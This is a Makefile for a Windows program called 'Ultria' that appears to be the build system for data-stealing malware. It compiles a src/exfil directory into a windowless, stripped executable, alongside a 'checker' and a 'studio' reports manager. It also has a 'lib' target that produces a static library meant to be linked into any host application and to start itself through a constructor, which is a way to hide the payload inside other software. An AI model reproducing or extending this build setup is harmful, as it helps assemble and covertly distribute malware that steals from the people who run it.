# Ultria build system
# Cross-compile from Linux:   make            (mingw-w64)
# Debug build:                make DEBUG=1    (console + logs)
# Windows/MSVC:               use build.bat

BIN      := dist/ultria.exe
BUILD    := build

# make without args must build everything (header-dep rule below would otherwise
# become the default goal).
.DEFAULT_GOAL := all

# default to mingw cross; override on command line (make CXX=... CC=...)
CXX      = x86_64-w64-mingw32-g++
CC       = x86_64-w64-mingw32-gcc
WINDRES  = x86_64-w64-mingw32-windres

DEFS     := -D_WIN32_WINNT=0x0A00 -DWIN32_LEAN_AND_MEAN -DNOMINMAX $(EXTRA_DEFS)

CXXFLAGS := -std=c++20 -O2 $(DEFS) -ffunction-sections -fdata-sections \
            -Wall -Wno-unused-function -Wno-unused-variable -Wno-unused-parameter \
            -I third_party
CFLAGS   := -O2 $(DEFS) -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables \
            -DSQLITE_OMIT_LOAD_EXTENSION -DSQLITE_THREADSAFE=0 -DSQLITE_DQS=0 \
            -DSQLITE_DEFAULT_MEMSTATUS=0 -DSQLITE_OMIT_PROGRESS_CALLBACK \
            -DSQLITE_OMIT_DECLTYPE -DSQLITE_OMIT_DEPRECATED -DSQLITE_TEMP_STORE=2
LDFLAGS  := -static -static-libgcc -static-libstdc++ -Wl,--gc-sections
LIBS     := -lbcrypt -lcrypt32 -lwinhttp -ladvapi32 -lshell32 -lshlwapi \
            -liphlpapi -lwlanapi -luser32 -lgdi32 -lgdiplus -lole32 -loleaut32 -luuid -lversion -lntdll \
            -lcomdlg32 -luxtheme -ldwmapi -lcomctl32

ifeq ($(DEBUG),1)
  CXXFLAGS += -DULTRA_DEBUG -g -O0
  CFLAGS   += -DULTRA_DEBUG
  LDFLAGS  += -mconsole
else
  LDFLAGS  += -mwindows -s
endif

SRC_CPP := $(wildcard src/*.cpp) $(wildcard src/core/*.cpp) $(wildcard src/modules/*.cpp) $(wildcard src/exfil/*.cpp)
SRC_C   := third_party/sqlite3.c third_party/miniz.c

# builder-injected extras (embedded GUI objects, bound resources)
-include config.mk

CHECKER_OBJ := $(BUILD)/src/gui/checker_gui.o $(BUILD)/src/gui/checker_main.o \
               $(BUILD)/src/core/sys.o $(BUILD)/src/gui/checker.o

OBJ := $(patsubst %.cpp,$(BUILD)/%.o,$(SRC_CPP)) \
       $(patsubst %.c,$(BUILD)/%.o,$(SRC_C)) \
       $(BUILD)/resources.o \
       $(GUI_OBJS) $(EXTRA_OBJS)

# header deps for our own objects (config.h regenerated per build)
HDRS := $(wildcard src/*.h src/core/*.h src/gui/*.h src/studio/*.h src/common/*.h src/modules.h) src/config.h
$(patsubst %.cpp,$(BUILD)/%.o,$(SRC_CPP)) \
$(BUILD)/src/gui/checker_gui.o $(BUILD)/src/gui/checker_main.o \
$(BUILD)/src/studio/studio_main.o: $(HDRS)

all: $(BIN) checker studio

$(BIN): $(OBJ)
	@mkdir -p dist
	$(CXX) $(OBJ) -o $@ $(LDFLAGS) $(LIBS)
	@echo "[+] built $@"
	@ls -la $@

$(BUILD)/%.o: %.cpp
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

$(BUILD)/%.o: %.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/%.o: %.rc
	@mkdir -p $(dir $@)
	$(WINDRES) $< -O coff -o $@

# ---- standalone checker app ----
checker: $(CHECKER_OBJ)
	@mkdir -p dist
	$(CXX) $(CHECKER_OBJ) -o dist/ultria-checker.exe $(LDFLAGS) $(LIBS)
	@echo "[+] built dist/ultria-checker.exe"
	@ls -la dist/ultria-checker.exe

# ---- studio (build & reports manager, console) ----
STUDIO_OBJ := $(BUILD)/src/studio/studio_main.o $(BUILD)/src/studio/studio.o \
              $(BUILD)/src/core/sys.o $(BUILD)/third_party/miniz.o
STUDIO_LDFLAGS := -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -mconsole -s
studio: $(STUDIO_OBJ)
	@mkdir -p dist
	$(CXX) $(STUDIO_OBJ) -o dist/ultria-studio.exe $(STUDIO_LDFLAGS) $(LIBS)
	@echo "[+] built dist/ultria-studio.exe"
	@ls -la dist/ultria-studio.exe

# ---- studio for Linux (native, same codebase) ----
STUDIO_LINUX_OBJ := build/linux/studio_main.o build/linux/miniz.o
build/linux/studio_main.o: src/studio/studio_main.cpp src/studio/studio.h src/common/combo.h
	@mkdir -p build/linux
	g++ -std=c++20 -O2 -Wall -Wno-unused-parameter -o $@ -c $<
build/linux/miniz.o: third_party/miniz.c
	@mkdir -p build/linux
	gcc -O2 -c third_party/miniz.c -o $@
studio-linux: $(STUDIO_LINUX_OBJ)
	@mkdir -p dist
	g++ $(STUDIO_LINUX_OBJ) -o dist/ultria-studio
	@echo "[+] built dist/ultria-studio (linux native)"
	@ls -la dist/ultria-studio

# ---- embeddable library (link into any host app; auto-starts via ctor) ----
AR := x86_64-w64-mingw32-ar
LIB_OBJ := $(filter-out $(BUILD)/src/main.o $(BUILD)/resources.o,$(OBJ)) \
           $(BUILD)/src/embed/auto_start.o
lib: $(LIB_OBJ)
	@mkdir -p dist
	$(AR) rcs dist/libultria.a $(LIB_OBJ)
	@echo "[+] built dist/libultria.a"
	@echo "    host link: g++ app.cpp -L dist -lultria -lbcrypt -lcrypt32 -lwinhttp \\"
	@echo "               -ladvapi32 -lshell32 -lshlwapi -liphlpapi -lwlanapi -luser32 \\"
	@echo "               -lgdi32 -lgdiplus -lole32 -loleaut32 -luuid -lversion -lntdll -static -static-libgcc -static-libstdc++"

clean:
	rm -rf $(BUILD) dist

.PHONY: all clean checker studio studio-linux lib
